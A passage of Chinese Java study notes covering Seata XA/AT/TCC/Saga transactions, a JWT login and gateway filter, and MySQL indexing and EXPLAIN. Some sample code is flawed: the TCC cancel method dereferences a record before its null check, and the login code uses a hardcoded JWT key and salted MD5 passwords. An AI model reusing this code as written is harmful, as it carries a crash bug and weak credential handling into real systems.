NULL DEFAULT NULL, `status` tinyint(4) NULL DEFAULT NULL, `client_id` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `application_data` varchar(2000) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `gmt_create` datetime(6) NULL DEFAULT NULL, `gmt_modified` datetime(6) NULL DEFAULT NULL, PRIMARY KEY (`branch_id`) USING BTREE, INDEX `idx_xid`(`xid`) USING BTREE ) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact; -- ---------------------------- -- 全局事务表 -- ---------------------------- DROP TABLE IF EXISTS `global_table`; CREATE TABLE `global_table` ( `xid` varchar(128) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL, `transaction_id` bigint(20) NULL DEFAULT NULL, `status` tinyint(4) NOT NULL, `application_id` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `transaction_service_group` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `transaction_name` varchar(128) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `timeout` int(11) NULL DEFAULT NULL, `begin_time` bigint(20) NULL DEFAULT NULL, `application_data` varchar(2000) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `gmt_create` datetime NULL DEFAULT NULL, `gmt_modified` datetime NULL DEFAULT NULL, PRIMARY KEY (`xid`) USING BTREE, INDEX `idx_gmt_modified_status`(`gmt_modified`, `status`) USING BTREE, INDEX `idx_transaction_id`(`transaction_id`) USING BTREE ) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact; SET FOREIGN_KEY_CHECKS = 1; 修改每个参与事务的微服务application.yml文件，开启XA模式： seata: data-source-proxy-mode: XA 在发起全局事务的入口方法上添加@GlobalTransactional注解 AT模式 AT模式与XA模式的区别 锁：XA模式一阶段不提交事务，锁定资源；AT模式一阶段直接提交，不锁定资源 恢复机制：XA模式依赖数据库机制实现回滚；AT模式利用数据快照实现数据恢复 一致性：XA模式强一致；AT模式最终一致 AT模式的写隔离 优缺点 AT模式的优点 一阶段完成直接提交事务，释放数据库资源，性能比较好 利用全局锁实现读写隔离 没有代码侵入，框架自动完成回滚和提交 AT模式的缺点 两阶段之间属于软状态，属于最终一致 框架的快照功能会影响性能，但比XA模式要好很多 实现AT模式 在TC服务关联的数据库（seata）中，添加lock_table、distributed_lock记录全局锁的表，undo_log表导入到微服务关联的数据库（seata_demo）： -- ---------------------------- -- undo_log表 记录数据快照 -- ---------------------------- DROP TABLE IF EXISTS `undo_log`; CREATE TABLE `undo_log` ( `branch_id` BIGINT(20) NOT NULL COMMENT 'branch transaction id', `xid` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT 'global transaction id', `context` VARCHAR(128) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT 'undo_log context,such as serialization', `rollback_info` LONGBLOB NOT NULL COMMENT 'rollback info', `log_status` INT(11) NOT NULL COMMENT '0:normal status,1:defense status', `log_created` DATETIME(6) NOT NULL COMMENT 'create datetime', `log_modified` DATETIME(6) NOT NULL COMMENT 'modify datetime', UNIQUE INDEX `ux_undo_log`(`xid`, `branch_id`) USING BTREE ) ENGINE = INNODB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'AT transaction mode undo table' ROW_FORMAT = COMPACT; SET NAMES utf8mb4; SET FOREIGN_KEY_CHECKS = 0; -- ---------------------------- -- 全局锁相关表 -- ---------------------------- CREATE TABLE IF NOT EXISTS `lock_table` ( `row_key` VARCHAR(128) NOT NULL, `xid` VARCHAR(128), `transaction_id` BIGINT, `branch_id` BIGINT NOT NULL, `resource_id` VARCHAR(256), `table_name` VARCHAR(32), `pk` VARCHAR(36), `status` TINYINT NOT NULL DEFAULT '0' COMMENT '0:locked ,1:rollbacking', `gmt_create` DATETIME, `gmt_modified` DATETIME, PRIMARY KEY (`row_key`), KEY `idx_status` (`status`), KEY `idx_branch_id` (`branch_id`), KEY `idx_xid_and_branch_id` (`xid` , `branch_id`) ) ENGINE = INNODB; CREATE TABLE IF NOT EXISTS `distributed_lock` ( `lock_key` CHAR(20) NOT NULL, `lock_value` VARCHAR(20) NOT NULL, `expire` BIGINT, PRIMARY KEY (`lock_key`) ) ENGINE = INNODB; INSERT INTO `distributed_lock` (lock_key, lock_value, expire) VALUES ('AsyncCommitting', ' ', 0); INSERT INTO `distributed_lock` (lock_key, lock_value, expire) VALUES ('RetryCommitting', ' ', 0); INSERT INTO `distributed_lock` (lock_key, lock_value, expire) VALUES ('RetryRollbacking', ' ', 0); INSERT INTO `distributed_lock` (lock_key, lock_value, expire) VALUES ('TxTimeoutCheck', ' ', 0); 修改每个参与事务的微服务application.yml文件，开启AT模式： seata: data-source-proxy-mode: AT # 默认就是AT 在发起全局事务的入口方法上添加@GlobalTransactional注解 TCC模式 TCC模式与AT模式非常相似，每阶段都是独立事务，不同的是TCC通过人工编码来实现数据恢复。需要结合业务功能实现三个方法： Try：资源的检测和冻结 Confirm：完成资源操作业务；要求 Try 成功 Confirm 一定要能成功 Cancel：释放冻结资源，可以理解为try的反向操作 优缺点 TCC模式的优点 一阶段完成直接提交事务，释放数据库资源，性能好 相比AT模式，无需生成快照，无需使用全局锁，性能最强 使用数据补偿机制，不依赖数据库事务 TCC模式的缺点 有代码侵入，需要人为编写try、Confirm和Cancel接口 软状态，事务是最终一致 需要考虑Confirm和Cancel失败的情况，需要做幂等处理 空回滚&业务悬挂 当某分支事务的try阶段阻塞时，可能导致全局事务超时而触发二阶段的cancel操作。在未执行try操作时先执行了cancel操作，这时cancel不能做回滚，就是空回滚。 因此，执行cancel操作时，应当判断try是否已经执行，如果尚未执行，则应该空回滚。 对于已经空回滚的业务，之前被阻塞的try操作恢复，继续执行try，就永远不可能confirm或cancel ，事务一直处于中间状态，这就是业务悬挂。 因此，执行try操作时，应当判断cancel是否已经执行过了，如果已经执行，应当阻止空回滚后的try操作，避免悬挂。 实现TCC模式 ==需根据业务自定义一张中间表==，在业务相关的数据库中创建如下表： xid：是全局事务id freeze_money：用来记录用户冻结金额 state：用来记录事务状态 CREATE TABLE `account_freeze_tbl`( `xid` varchar(128) NOT NULL, `user_id` varchar(255) DEFAULT NULL COMMENT'用户id', `freeze_money`int(11) unsigned DEFAULT'0'COMMENT'冻结金额', `state`int(1) DEFAULT NULL COMMENT'事务状态，0:try，1:confirm，2:cancel', PRIMARY KEY(`xid`)USING BTREE )ENGINE=InnoDB DEFAULT CHARSET=utf8 ROW_FORMAT=COMPACT; 在发起全局事务的入口方法上添加@GlobalTransactional注解 实现逻辑 try： - 业务悬挂处理（根据xid查询中间表，如果NoNull则证明Cancel已经执行，即刻终止） - 将冻结资源，事务状态等添加到中间表 - 实现业务代码 confirm： - 幂等处理（第一次执行后数据就已经删除，后续操作只会返回false，已经幂等） - 根据事务id删除中间表数据 cancel： - 空回滚处理（根据xid查询中间表，如果为Null则说明try还没做，需要空回滚） - 幂等处理（处理并发cancel；如果冻结资源状态为cancel，则说明已经cancel了，即刻终止） - 释放冻结资源，恢复数据 - 更新中间表的事务状态、清空冻结资源 编写实体类和Mapper接口 package cn.itcast.account.entity; import com.baomidou.mybatisplus.annotation.IdType; import com.baomidou.mybatisplus.annotation.TableId; import com.baomidou.mybatisplus.annotation.TableName; import lombok.Data; @Data @TableName(\"account_freeze_tbl\") public class AccountFreeze { @TableId(type = IdType.INPUT) private String xid; private String userId; private Integer freezeMoney; private Integer state; public static abstract class State { public final static int TRY = 0; public final static int CONFIRM = 1; public final static int CANCEL = 2; } } package cn.itcast.account.mapper; import cn.itcast.account.entity.AccountFreeze; import com.baomidou.mybatisplus.core.mapper.BaseMapper; public interface AccountFreezeMapper extends BaseMapper { } 声明TCC接口，三个方法，三个注解，三个属性值 @LocalTCC public interface TCCService { /** * Try逻辑，@TwoPhaseBusinessAction中的name属性要与当前方法名一致，用于指定Try逻辑对应的方法 */ @TwoPhaseBusinessAction(name = \"prepare\", commitMethod = \"confirm\", rollbackMethod = \"cancel\") void prepare(@BusinessActionContextParameter(paramName = \"param\") String param); /** * 二阶段confirm确认方法、可以另命名，但要保证与commitMethod一致 * * @param context 上下文,可以传递try方法的参数 * @return boolean 执行是否成功 */ boolean confirm(BusinessActionContext context); /** * 二阶段回滚方法，要保证与rollbackMethod一致 */ boolean cancel(BusinessActionContext context); } package cn.itcast.account.service; import io.seata.rm.tcc.api.BusinessActionContext; import io.seata.rm.tcc.api.BusinessActionContextParameter; import io.seata.rm.tcc.api.LocalTCC; import io.seata.rm.tcc.api.TwoPhaseBusinessAction; @LocalTCC public interface AccountTCCService { /** * 根据用户id扣减余额，记录冻结金额 * commitMethod 提交时对于的方法；rollbackMethod回滚时对于的方法 * @param userId 用户id * @param money 扣减金额 */ @TwoPhaseBusinessAction(name = \"deduct\", commitMethod = \"confirm\", rollbackMethod = \"cancel\") void deduct(@BusinessActionContextParameter(\"userId\")String userId, @BusinessActionContextParameter(\"money\")int money); /** * 执行TCC事务时，提交事务时执行的方法 * @param ctx 上下文对象 * @return 执行结果 */ Boolean confirm(BusinessActionContext ctx); /** * 执行TCC事务时，回滚事务时执行的方法 * @param ctx 上下文对象 * @return 执行结果 */ Boolean cancel(BusinessActionContext ctx); } 编写实现类，实现TCC业务 package cn.itcast.account.service.impl; import cn.itcast.account.entity.AccountFreeze; import cn.itcast.account.mapper.AccountFreezeMapper; import cn.itcast.account.mapper.AccountMapper; import cn.itcast.account.service.AccountTCCService; import io.seata.core.context.RootContext; import io.seata.rm.tcc.api.BusinessActionContext; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Service; import org.springframework.transaction.annotation.Transactional; import java.util.Objects; @Service public class AccountTCCServiceImpl implements AccountTCCService { @Autowired private AccountMapper accountMapper; @Autowired private AccountFreezeMapper accountFreezeMapper; @Override @Transactional public void deduct(String userId, int money) { //获取全局事务id String xid = RootContext.getXID(); //处理业务悬挂 AccountFreeze localFreeze = accountFreezeMapper.selectById(xid); if (Objects.nonNull(localFreeze)) { //如果非空，说明已经cancel过 return; } //1 扣减余额 accountMapper.deduct(userId, money); //2 记录冻结金额 AccountFreeze accountFreeze = new AccountFreeze(); accountFreeze.setXid(xid); accountFreeze.setUserId(userId); accountFreeze.setFreezeMoney(money); accountFreeze.setState(AccountFreeze.State.TRY); accountFreezeMapper.insert(accountFreeze); } @Override public Boolean confirm(BusinessActionContext context) { //删除冻结金额 String xid = context.getXid(); int count = accountFreezeMapper.deleteById(xid); return count == 1; } @Override public Boolean cancel(BusinessActionContext context) { //获取xid String xid = context.getXid(); //获取用户ID和冻结金额 String userId = context.getActionContext(\"userId\").toString(); AccountFreeze localFreeze = accountFreezeMapper.selectById(xid); Integer freezeMoney = localFreeze.getFreezeMoney(); //处理空回滚 if (Objects.isNull(localFreeze)) { //如果没有经过try方法，则为null AccountFreeze accountFreeze = new AccountFreeze(); accountFreeze.setXid(xid); accountFreeze.setUserId(userId); accountFreeze.setFreezeMoney(0); accountFreeze.setState(AccountFreeze.State.CANCEL); accountFreezeMapper.insert(accountFreeze); return Boolean.TRUE; } //幂等处理 if (localFreeze.getState() == AccountFreeze.State.CANCEL) { //说明已经回滚过了,不需要再处理 return Boolean.TRUE; } //1 回退金额 accountMapper.refund(userId, freezeMoney); //2 更新冻结金额为0和状态 localFreeze.setFreezeMoney(0); localFreeze.setState(AccountFreeze.State.CANCEL); int count = accountFreezeMapper.updateById(localFreeze); return count == 1; } } 改造原Controller方法 Saga模式 分布式事务执行过程中，依次执行各参与者的正向操作，如果所有正向操作均执行成功，那么分布式事务提交。如果任何一个正向操作执行失败，那么分布式事务会去退回去执行前面各参与者的逆向回滚操作，回滚已提交的参与者，使分布式事务回到初始状态。 优缺点 Saga模式的优点 事务参与者可以基于事件驱动实现异步调用，吞吐高 一阶段直接提交事务，无锁，性能好 不用编写TCC中的三个阶段，实现简单 Saga模式的缺点 软状态持续时间不确定，时效性差 没有锁，没有事务隔离，会有脏写 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-03-21 20:09 "},"Java笔记/Day65-JWT&日志.html":{"url":"Java笔记/Day65-JWT&日志.html","title":"Day65-JWT&日志","keywords":"","body":"黑马商城 主体结构 JWT 基于token的用户认证是一种服务端无状态的认证方式，所谓服务端无状态指的token本身包含登录用户所有的相关数据，而客户端在认证后的每次请求都会携带token，因此服务器端无需存放token数据。 当用户认证后，服务端生成一个token发给客户端，客户端可以放到 cookie 或 localStorage 等存储中，每次请求时带上 token，服务端收到token通过验证后即可确认用户身份。 JSON Web Token（JWT）是一个开放的行业标准（RFC 7519），它定义了一种简洁的、自包含的协议格式，用于在通信双方传递json对象，传递的信息经过数字签名可以被验证和信任。 JWT结构：JWT令牌由Header、Payload、Signature三部分组成，每部分中间使用点（.）分隔 Header：存放令牌的类型（即JWT）及使用的哈希算法（如HMAC、SHA256或RSA） Payload：存放有效信息的地方，有iss（签发者），exp（过期时间戳）， sub（面向的用户）等 Signature：签名，此部分用于防止jwt内容被篡改 生成jwt代码实现 导入依赖 io.jsonwebtoken jjwt 工具类 ```java package com.heima.utils.common; import io.jsonwebtoken.*; import javax.crypto.SecretKey; import javax.crypto.spec.SecretKeySpec; import java.util.*; public class AppJwtUtil { // TOKEN的有效期一天（S） private static final int TOKEN_TIME_OUT = 3_600; // 加密KEY private static final String TOKEN_ENCRY_KEY = \"MDk4ZjZiY2Q0NjIxZDM3M2NhZGU0ZTgzMjYyN2I0ZjY\"; // 最小刷新间隔(S) private static final int REFRESH_TIME = 300; // 生产ID public static String getToken(Long id){ Map claimMaps = new HashMap<>(); claimMaps.put(\"id\",id); long currentTime = System.currentTimeMillis(); return Jwts.builder() .setId(UUID.randomUUID().toString()) .setIssuedAt(new Date(currentTime)) //签发时间 .setSubject(\"system\") //说明 .setIssuer(\"heima\") //签发者信息 .setAudience(\"app\") //接收用户 .compressWith(CompressionCodecs.GZIP) //数据压缩方式 .signWith(SignatureAlgorithm.HS512, generalKey()) //加密方式 .setExpiration(new Date(currentTime + TOKEN_TIME_OUT * 1000)) //过期时间戳 .addClaims(claimMaps) //cla信息 .compact(); } /** * 获取token中的claims信息 * * @param token * @return */ private static Jws getJws(String token) { return Jwts.parser() .setSigningKey(generalKey()) .parseClaimsJws(token); } /** * 获取payload body信息 * * @param token * @return */ public static Claims getClaimsBody(String token) { try { return getJws(token).getBody(); }catch (ExpiredJwtException e){ return null; } } /** * 获取hearder body信息 * * @param token * @return */ public static JwsHeader getHeaderBody(String token) { return getJws(token).getHeader(); } /** * 是否过期 * * @param claims * @return -1：有效，0：有效，1：过期，2：过期 */ public static int verifyToken(Claims claims) { if(claims==null){ return 1; } try { claims.getExpiration() .before(new Date()); // 需要自动刷新TOKEN if((claims.getExpiration().getTime()-System.currentTimeMillis())>REFRESH_TIME*1000){ return -1; }else { return 0; } } catch (ExpiredJwtException ex) { return 1; }catch (Exception e){ return 2; } } /** * 由字符串生成加密key * * @return */ public static SecretKey generalKey() { byte[] encodedKey = Base64.getEncoder().encode(TOKEN_ENCRY_KEY.getBytes()); SecretKey key = new SecretKeySpec(encodedKey, 0, encodedKey.length, \"AES\"); return key; } public static void main(String[] args) { //1.获取token String token = AppJwtUtil.getToken(1l); System.out.println(token); //2.校验token是否有效 Claims claimsBody = AppJwtUtil.getClaimsBody(token); System.out.println(claimsBody); int i = AppJwtUtil.verifyToken(claimsBody); System.out.println(i); if(i==-1 || i==0){ System.out.println(\"token还处于有效期\"); }else{ System.out.println(\"token已经无效\"); } } } #### 登录功能实现 - 实体类 ```java package com.heima.model.user.pojos; import com.baomidou.mybatisplus.annotation.IdType; import com.baomidou.mybatisplus.annotation.TableField; import com.baomidou.mybatisplus.annotation.TableId; import com.baomidou.mybatisplus.annotation.TableName; import lombok.Data; import java.io.Serializable; import java.util.Date; /** * * APP用户信息表 * * * @author itheima */ @Data @TableName(\"ap_user\") public class ApUser implements Serializable { private static final long serialVersionUID = 1L; /** * 主键 */ @TableId(value = \"id\", type = IdType.AUTO) private Integer id; /** * 密码、通信等加密盐 */ @TableField(\"salt\") private String salt; /** * 用户名 */ @TableField(\"name\") private String name; /** * 密码,md5加密 */ @TableField(\"password\") private String password; /** * 手机号 */ @TableField(\"phone\") private String phone; /** * 头像 */ @TableField(\"image\") private String image; /** * 0 男 1 女 2 未知 */ @TableField(\"sex\") private Boolean sex; /** * 0 未 1 是 */ @TableField(\"is_certification\") private Boolean certification; /** * 是否身份认证 */ @TableField(\"is_identity_authentication\") private Boolean identityAuthentication; /** * 0正常 1锁定 */ @TableField(\"status\") private Boolean status; /** * 0 普通用户 1 自媒体人 2 大V */ @TableField(\"flag\") private Short flag; /** * 注册时间 */ @TableField(\"created_time\") private Date createdTime; } LoginDto @Data public class LoginDto { /** * 手机号 */ private String phone; /** * 密码 */ private String password; } 持久层mapper package com.heima.user.mapper; import com.baomidou.mybatisplus.core.mapper.BaseMapper; import com.heima.model.user.pojos.ApUser; import org.apache.ibatis.annotations.Mapper; @Mapper public interface ApUserMapper extends BaseMapper { } 业务层service package com.heima.user.service; import com.baomidou.mybatisplus.extension.service.IService; import com.heima.model.common.dtos.ResponseResult; import com.heima.model.user.dtos.LoginDto; import com.heima.model.user.pojos.ApUser; public interface ApUserService extends IService{ /** * app端登录 * @param dto * @return */ public ResponseResult login(LoginDto dto); } 实现类 ```java package com.heima.user.service.impl; import com.baomidou.mybatisplus.core.toolkit.Wrappers; import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl; import com.heima.model.common.dtos.ResponseResult; import com.heima.model.common.enums.AppHttpCodeEnum; import com.heima.model.user.dtos.LoginDto; import com.heima.model.user.pojos.ApUser; import com.heima.user.mapper.ApUserMapper; import com.heima.user.service.ApUserService; import com.heima.utils.common.AppJwtUtil; import org.apache.commons.lang3.StringUtils; import org.springframework.stereotype.Service; import org.springframework.util.DigestUtils; import java.util.HashMap; import java.util.Map; @Service public class ApUserServiceImpl extends ServiceImpl implements ApUserService { @Override public ResponseResult login(LoginDto dto) { //1.正常登录（手机号+密码登录） if (!StringUtils.isBlank(dto.getPhone()) && !StringUtils.isBlank(dto.getPassword())) { //1.1查询用户 ApUser apUser = getOne(Wrappers.lambdaQuery().eq(ApUser::getPhone, dto.getPhone())); if (apUser == null) { return ResponseResult.errorResult(AppHttpCodeEnum.DATA_NOT_EXIST,\"用户不存在\"); } //1.2 比对密码 String salt = apUser.getSalt(); String pswd = dto.getPassword(); pswd = DigestUtils.md5DigestAsHex((pswd + salt).getBytes()); if (!pswd.equals(apUser.getPassword())) { return ResponseResult.errorResult(AppHttpCodeEnum.LOGIN_PASSWORD_ERROR); } //1.3 返回数据 jwt Map map = new HashMap<>(); map.put(\"token\", AppJwtUtil.getToken(apUser.getId().longValue())); apUser.setSalt(\"\"); apUser.setPassword(\"\"); map.put(\"user\", apUser); return ResponseResult.okResult(map); } else { //2.游客 同样返回token id = 0 Map map = new HashMap<>(); map.put(\"token\", AppJwtUtil.getToken(0l)); return ResponseResult.okResult(map); } } } - 控制层controller ```java package com.heima.user.controller.v1; import com.heima.model.common.dtos.ResponseResult; import com.heima.model.user.dtos.LoginDto; import com.heima.user.service.ApUserService; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestBody; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; @RestController @RequestMapping(\"/api/v1/login\") public class ApUserLoginController { @Autowired private ApUserService apUserService; @PostMapping(\"/login_auth\") public ResponseResult login(@RequestBody LoginDto dto) { return apUserService.login(dto); } } 网关实现jwt校验 网关微服务中新建全局过滤器 ```java package com.heima.app.gateway.filter; import com.heima.app.gateway.util.AppJwtUtil; import io.jsonwebtoken.Claims; import lombok.extern.slf4j.Slf4j; import org.apache.commons.lang.StringUtils; import org.springframework.cloud.gateway.filter.GatewayFilterChain; import org.springframework.cloud.gateway.filter.GlobalFilter; import org.springframework.core.Ordered; import org.springframework.http.HttpStatus; import org.springframework.http.server.reactive.ServerHttpRequest; import org.springframework.http.server.reactive.ServerHttpResponse; import org.springframework.stereotype.Component; import org.springframework.web.server.ServerWebExchange; import reactor.core.publisher.Mono; @Component @Slf4j public class AuthorizeFilter implements Ordered, GlobalFilter { @Override public Mono filter(ServerWebExchange exchange, GatewayFilterChain chain) { //1.获取request和response对象 ServerHttpRequest request = exchange.getRequest(); ServerHttpResponse response = exchange.getResponse(); //2.判断是否是登录 if(request.getURI().getPath().contains(\"/login/login_auth\")){ //放行 return chain.filter(exchange); } //3.获取token String token = request.getHeaders().getFirst(\"token\"); //4.判断token是否存在 if(StringUtils.isBlank(token)){ response.setStatusCode(HttpStatus.UNAUTHORIZED); return response.setComplete(); } //5.判断token是否有效 try { Claims claimsBody = AppJwtUtil.getClaimsBody(token); //是否是过期 int result = AppJwtUtil.verifyToken(claimsBody); if(result == 1 || result == 2){ response.setStatusCode(HttpStatus.UNAUTHORIZED); return response.setComplete(); } }catch (Exception e){ e.printStackTrace(); response.setStatusCode(HttpStatus.UNAUTHORIZED); return response.setComplete(); } //6.放行 return chain.filter(exchange); } /** * 优先级设置 值越小 优先级越高 * @return */ @Override public int getOrder() { return 0; } } ### 日志文件 - 在resources文件夹下创建logback.xml ```xml %d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n utf8 ${LOG_HOME}/leadnews.%d{yyyy-MM-dd}.log %d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n 0 512 --> Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-02-17 12:15 "},"Java笔记/就业加强-MySQL.html":{"url":"Java笔记/就业加强-MySQL.html","title":"就业加强-MySQL","keywords":"","body":"MySQL体系结构 第一层：网络连接层 主要是指数据库连接池，会负责处理所有客户端接入的工作 第二层：核心服务层 主要包含SQL接口（接受SQL 命令，返回查询结果）、解析器、优化器以及缓存缓冲区四块区域 第三层：存储引擎层 指MySQL支持的各大存储引擎，如MyISAM、InnoDB等 MyISAM：不支持事务和外键操作，访问快；适合查询以及插入为主的应用（5.5 之前版本默认存储引擎） InnoDB：支持事务和外键操作，支持并发控制，占用磁盘空间大；适合频繁修改以及涉及到安全性较高的应用（5.5 之后版本默认存储引擎） MEMORY：内存存储，速度快，不安全；适合小量快速访问的数据 修改存储引擎 -- 修改存储引擎 ALTER TABLE 表名 ENGINE = 引擎; 第四层：系统文件层 涵盖了所有的配置、日志、数据、索引文件，位于系统硬盘上 常见优化方案 关键参数：TPS每秒执行的事务数；QPS每秒执行的SQL数（增删查改） 索引优化：添加适当索引 sql语句优化：避免索引失效 关联查询：不允许超过3张表，对设计不合理的表进行优化合并 设计优化：表的设计要符合三范式（3NF），有时候要进行反三范式操作 架构优化：分表（水平分割、垂直分割），主从分离、读写分离 配置优化：对mysql配置进行优化（最大并发数、缓存大小） 使用其他存储方式：redis、mongodb、es、solr等 直接修改MySQL内核 硬件升级 索引 索引：==是一种数据结构（B+Tree）==，是对表的数据进行重新编排和建立目录映射 建立索引的目的：减少磁盘IO次数，加快查询效率 页(page)：内存操作的基本单位 数据库对数据的读取并不是以行为单位进行的，无论是读取一行还是多行，都会将该行或者多行所在的页全部加载进来，然后再读取对应的数据记录；也就是说，读取所耗费的时间与行数无关，只与页数有关。页的大小通常为磁盘块大小的 2^n 倍。 -- 查询MySQL一页的大小 SHOW GLOBAL STATUS LIKE 'innodb_page_size'; 磁盘块(IO Block)：磁盘操作的基本单位 系统从磁盘读取数据到内存时以磁盘块block为基本单位的，位于同一个磁盘块中的数据会被一次性读取出来，不是需要什么取什么 度(Degree)：节点的数据存储个数，一旦存储数据超过度值就要进行节点分裂 二叉树 每一个节点分别包含索引键和一个指向对应数据记录的物理地址的指针 缺点：磁盘IO的次数由树的高度来决定。二叉树只能存两个节点，层级越来越大越来越深，发生磁盘的IO会越频繁。 B-Tree B-Tree即B树，又称为多路平衡查找树。每个节点包含key和data。 缺点： B-Tree数据是存储到每个节点中，所以每次维护的时候就会维护索引值又维护了数据，这样会就是造成内存的浪费和性能的消耗。 在B-Tree中每一个节点存储空间有限，如果data数据较大，会导致每个节点key太小，当数据量很大时也会导致B-Tree深度较大，增大查询的磁盘IO次数，影响查询效率。 B+Tree 在B-Tree基础上进行优化，使其更适合实现外存储索引结构。InnoDB就是存储引擎就是用B+Tree。 在B+Tree中，所有数据记录节点都是按照键值大小顺序存放在同一层叶子节点上，而非叶子节点只存储key值信息，可以大大增大每个节点存储的key值的数量，降低B+Tree的高度。 所有数据存储在叶子节点 所有叶子节点之间都有连接指针 非叶子节点只存储key值 非聚簇&聚簇 非聚簇：索引文件和数据文件是分离的。叶子节点存储的是数据的磁盘地址，非主键索引和主键索引类似。 MyISAM就是非聚簇的，其文件分为.frm 表结构文件、.MYD 表数据文件、.MYI 表索引文件。 聚簇：数据文件本身就是索引文件。 InnoDB就是聚簇的，其没有.MYD和.MYI，.frm文件（包括的数据结构和索引结构），其数据文件对应于ibdata(1..n)文件中。 在开发过程中如果你使用的是Innodb引擎一定要建立一个主键列。 ==面试题：== 对于InnoDB引擎如果不建立主键MySQL数据库会怎么处理？ MySQL会找唯一字段作为主键 如果没有唯一字段MySQL会生成伪列当做主键，开发人员看不见 为什么主键使用UUID不好？为什么使用自增主键最好？ UUID是字符串，排序时需要计算字符串的ascii码值，降低效率 UUID不是连续的，增加数据时对B+树的改动较大，降低效率 索引优劣&注意事项 优势： 唯一索引可以保证数据库表每一行的唯一性 大大加快数据的查询速度 加速表与表之间的连接 劣势： 创建和维护索引会耗费时间，随着数据量的增加而增加 除了数据表需要占用物理空间之外，每一个索引文件还会占用一定的物理空间 当对表的数据进行INSERT，UPDATE，DELETE 的时候，索引也要动态的维护，这样就会降低增删改数据的速度 注意事项： 建立索引后需要注意的问题 增，删，改都会触发索引重建，并且会产生锁 删除尽量逻辑删除，不要物理删除，防止索引重建 尽量不要更新索引的列，经常频繁更新的列不要建立索引 哪些列适合建立索引 不经常变动的列：主键、电话、手机号、邮箱、订单编号、身份证 哪些列不适合建立索引 经常变动的列：用户名、余额 数据较为单一，存在大量重复数据的列：年龄、性别、状态（表中某列的去重数/表总记录数 == 1(接近1)，那么这种列就特别适合建立索引） 索引分类 主键索引：primary key（不为空且唯一） 唯一索引：unique index（唯一） 普通索引：index 联合索引： primary key(id, name)：联合主键索引 unique index(id, name)：联合唯一索引 index(id, name)：联合普通索引 全文索引：fulltext index(字段名)：用于搜索很长一篇文章的时候，效果比较好（最好还是用全文搜索服务Elasticsearch、solr来解决） 索引的操作 查看索引 -- SHOW INDEX FROM 表名 show index from system_user; 创建索引 -- 创建主键索引: alter table 表名 add primary key(列名) ALTER TABLE goods ADD PRIMARY KEY (id); -- 创建唯一索引: CREATE UNIQUE INDEX 索引名 ON 表名(列名) CREATE UNIQUE INDEX idx_name ON goods(NAME); -- 创建普通索引: CREATE INDEX 索引名 ON 表名(列名) CREATE INDEX idx_price ON goods(price); 删除索引 -- 删除主键索引(非自增长): alter table 表名 drop primary key ALTER TABLE goods DROP PRIMARY KEY; -- 删除唯一索引和普通索引: DROP INDEX 索引名 ON 表名 DROP INDEX idx_name ON goods; DROP INDEX idx_price ON goods; 查看索引详情 -- SHOW INDEX FROM 表名 show index from system_user; Table: 表的名称 Non_unique: 如果索引不能包括重复词则为0，如果可以重复则为1 Key_name: 索引的名称 Seq_in_index: 索引中的序列号，从1开始 Column_name: 索引字段的列名称 Collation: 列以什么方式存储在索引中。在MySQL中，‘A’(升序)或NULL(无分类) Cardinality: 基数。基数越大，越适合建立索引，当进行查询时，MySQL使用该索引的机会就越大 Sub_part: 如果列只是被部分地编入索引，则为被编入索引的字符的数目。如果整列被编入索引，则为NULL Packed: 关键字如何被压缩。如果没有被压缩，则为NULL Null: 如果列含有NULL，则含有YES。如果没有，则该列含有NO Index_type: 索引存储数据结构（BTREE, FULLTEXT, HASH, RTREE） Comment: 评论 执行计划Explain 语法：使用Explain关键字放到sql语句前explain select * from system_user where id = 1; 作用 可以知道SQL语句的执行顺序 可以知道SQL查询语句是否命中索引 可以分析查询语句或表结构的性能瓶颈 详解 列名 说明 ==id== 查询标识符，SQL执行的顺序标识符，SQL从大到小的执行。 select_type 显示本行是简单或复杂查询。如果查询有任何复杂的子查询，则最外层标记为PRIMARY（DERIVED、UNION、UNION RESUlT） ==table== 访问哪张表 partitions 在分区数据库中，一个表可以分布在一个或多个数据库分区中 ==type== 访问类型（ALL、index、range、ref、eq_ref、const、system） possible_keys 显示MySQL可能采用哪些索引来优化查询 ==key== 显示MySQL决定采用哪个索引来优化查询 ==key_len== 显示索引所使用的字节数，索引长度越小效率越高 ref 显示查询时所引用到的索引（关联查询） ==rows== 粗略估算整个查询需要检查的行数（如果值越大，查询速度就越慢） filtered 过滤行的百分比 Extra 额外信息（用了where条件、用了排序、用了分组）等 id id值相同，从上到下执行。一般查的第一张表为数据量最小的表。 id值不同，由大到小执行。 select_type 查询类型 union: 取并集，过滤重复。（如果两条SQL语句出现相同的就会过滤掉） union all: 取并集，不过滤重复。 主要用来区分是普通查询、联合查询、子查询等 | 查询类型 | 说明 | | ------------ | ------------------------------------------------------------ | | SIMPLE | 简单查询，查询中不包含子查询或者union | | PRIMARY | 查询中如果包含子查询或union，最外层查询则被标记为primary | | SUBQUERY | 查询时包含了子查询 | | DERIVED | from列表中包含了子查询就会标记为derived(派生表)，查询结果放在临时表中 | | UNION | 查询时包含了union查询 | | UNION 